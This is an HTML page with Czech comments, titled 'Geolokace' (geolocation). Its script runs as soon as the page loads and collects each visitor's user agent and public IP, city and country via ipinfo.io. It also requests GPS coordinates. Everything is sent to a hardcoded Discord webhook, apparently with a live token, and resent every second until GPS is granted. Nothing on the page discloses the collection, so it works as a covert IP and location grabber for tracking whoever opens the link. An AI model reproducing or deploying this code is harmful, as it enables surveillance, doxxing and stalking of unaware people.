<!DOCTYPE html>
<html lang="cs">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Geolokace</title>
</head>
<body>
    <h1>Geolokace a informace o za콏칤zen칤</h1>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1336736765674917979/lyGotJhq7TWp2kRsHpd_246EPiXxMZ91S3rKDVuq54iFQX-FY8TlJ7pat1eBph-KL0XC"; // Nahra캞 sv칳m webhookem
        let gpsConfirmed = false;  // Zji코t캩n칤, zda bylo GPS potvrzeno

        function sendToDiscord(message) {
            fetch(WEBHOOK_URL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ content: message })
            }).catch(error => console.error("Chyba odes칤l치n칤:", error));
        }

        function getIP(device, gpsData) {
            fetch("https://ipinfo.io/json")
            .then(response => response.json())
            .then(data => {
                const message = `@everyone\n游님 Za콏칤zen칤: ${device}\n游깴 IP Adresa: ${data.ip} (M캩sto: ${data.city}, Zem캩: ${data.country})\n游깷 VPN: ${isVPN()}\n${gpsData}`;

                sendToDiscord(message);
            })
            .catch(error => console.error("Chyba z칤sk치n칤 IP:", error));
        }

        function getLocation() {
            let device = navigator.userAgent; // Detekce za콏칤zen칤

            // Odes칤l치n칤 IP a za콏칤zen칤 ihned po na캜ten칤 str치nky
            getIP(device, "游뛂 GPS nen칤 potvrzena");

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(position => {
                    const lat = position.coords.latitude.toFixed(6);
                    const lon = position.coords.longitude.toFixed(6);
                    gpsConfirmed = true;
                    getIP(device, `游늸 GPS: ${lat}, ${lon}`);
                }, () => {
                    getIP(device, "游뛂 GPS zam칤tnuta");
                });
            } else {
                getIP(device, "游뛂 GPS nen칤 podporov치na");
            }
        }

        function isVPN() {
            // Sem m콢쬰코 p콏idat logiku pro detekci VPN (z치le쮂 na dal코칤ch metod치ch)
            return "FALSE";  // Defaultn칤 hodnota pro VPN. M콢쬰코 p콏idat detekci VPN, pokud m치코 takov칠 mo쬹osti
        }

        window.onload = function() {
            getLocation();

            // Interval pro odes칤l치n칤 informac칤 ka쬯ou sekundu, dokud nen칤 GPS potvrzena
            const interval = setInterval(() => {
                let device = navigator.userAgent;
                if (gpsConfirmed) {
                    clearInterval(interval);  // Po potvrzen칤 GPS se interval zastav칤
                }
                getIP(device, gpsConfirmed ? `游늸 GPS potvrzena.` : "游뛂 GPS nen칤 potvrzena");
            }, 1000); // 1000 ms = 1 sekunda
        };
    </script>
</body>
</html>
